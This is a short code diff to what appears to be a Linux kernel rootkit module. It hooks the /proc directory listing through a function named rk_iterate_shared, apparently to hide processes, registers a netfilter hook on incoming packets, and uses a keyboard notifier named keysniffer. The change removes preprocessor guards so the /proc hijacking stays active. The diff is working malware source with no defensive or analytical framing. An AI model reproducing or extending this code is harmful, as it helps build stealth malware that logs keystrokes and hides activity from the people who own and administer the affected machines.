@@ -611,7 +611,6 @@ static int __init mod_init(void) {
     alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
     my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");
 
-#if 1
     if (kern_path("/proc", 0, &proc_path)) {
         return -1;
     }
@@ -620,7 +619,6 @@ static int __init mod_init(void) {
     backup_proc_fops = proc_inode->i_fop;
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
-#endif
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -680,10 +678,8 @@ static void __exit mod_exit(void) {
 
     unregister_keyboard_notifier(&keysniffer_blk);
 
-#if 1
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
-#endif
 
     if (svc) {
         if (svc->tls_socket) {
